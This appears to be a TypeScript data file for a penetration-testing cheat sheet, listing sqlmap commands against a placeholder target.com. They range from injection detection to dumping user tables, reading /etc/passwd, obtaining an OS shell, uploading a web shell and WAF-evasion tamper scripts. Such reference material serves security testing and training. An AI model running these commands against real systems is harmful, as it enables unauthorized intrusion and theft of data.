export interface SQLMapCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const sqlmapCategories: SQLMapCategory[] = [
  {
    category: "Installation & Setup",
    commands: [
      {
        command: "git clone https://github.com/sqlmapproject/sqlmap.git && cd sqlmap",
        description: "Clone the latest version from GitHub",
      },
      {
        command: "apt install sqlmap",
        description: "Install on Kali/Debian",
      },
      {
        command: "python3 sqlmap.py --version",
        description: "Verify installation",
      },
    ],
  },
  {
    category: "Basic Detection",
    commands: [
      {
        command: "sqlmap -u \"https://target.com/page?id=1\"",
        description: "#1 Test a single URL for SQL injection",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --batch",
        description: "#2 Batch mode — no prompts, uses defaults",
      },
      {
        command: "sqlmap -u \"https://target.com/login\" --data=\"user=admin&pass=test\"",
        description: "#3 Test POST form with login credentials",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --cookie=\"session=abc123\"",
        description: "#4 Test with authenticated session cookie",
      },
    ],
  },
  {
    category: "Database Enumeration",
    commands: [
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --dbs",
        description: "#1 Enumerate all databases",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" -D dbname --tables",
        description: "#2 List all tables in a specific database",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" -D dbname -T users --columns",
        description: "#3 List all columns in the users table",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" -D dbname -T users --dump",
        description: "#4 Dump all data from the users table",
      },
    ],
  },
  {
    category: "Advanced Enumeration",
    commands: [
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --dump-all",
        description: "#1 Dump all databases and all tables",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" -D dbname -T users --dump --where=\"role='admin'\"",
        description: "#2 Dump with WHERE filter for specific rows",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --schema",
        description: "#3 Show database schema structure",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --search -T user",
        description: "#4 Search for tables matching a pattern",
      },
    ],
  },
  {
    category: "Request Handling",
    commands: [
      {
        command: "sqlmap -r request.txt",
        description: "#1 Load full HTTP request from Burp/Repeater file",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --headers=\"X-Forwarded-For: 127.0.0.1\"",
        description: "#2 Add custom HTTP headers",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --proxy=\"http://127.0.0.1:8080\"",
        description: "#3 Route through Burp Suite for inspection",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --delay=1",
        description: "#4 Add delay between requests (stealth)",
      },
    ],
  },
  {
    category: "Privilege Escalation & OS Shell",
    commands: [
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --os-shell",
        description: "#1 Get an interactive OS shell (DB write perms required)",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --os-cmd=\"whoami\"",
        description: "#2 Execute a single OS command and get output",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --file-read=\"/etc/passwd\"",
        description: "#3 Read a file from the database server",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --file-write=\"/tmp/shell.php\" --file-dest=\"/var/www/html/shell.php\"",
        description: "#4 Upload a web shell to the server",
      },
    ],
  },
  {
    category: "WAF & Evasion Techniques",
    commands: [
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --tamper=space2comment",
        description: "#1 Bypass WAF using space-to-comment tamper script",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" --tamper=randomcase --level=5",
        description: "#2 Random case + max level for strict WAFs",
      },
      {
        command: "sqlmap -u \"https://target.com/page?id=1\" -v 3 --tamper=between",
        description: "#3 Verbose mode + between tamper for logging WAF bypass",
      },
      {
        command: "sqlmap --list-tampers",
        description: "#4 List all available tamper scripts",
      },
    ],
  },
]

export const sqlmapTools = [
  {
    name: "SQLMap GitHub",
    url: "https://github.com/sqlmapproject/sqlmap",
    description: "Official repository with documentation and examples",
  },
  {
    name: "PayloadsAllTheThings - SQL Injection",
    url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
    description: "Comprehensive SQL injection payload reference",
  },
  {
    name: "WAF Bypass with SQLMap",
    url: "/waf-bypass/sqlmap",
    description: "Step-by-step SQLMap WAF evasion techniques",
  },
]
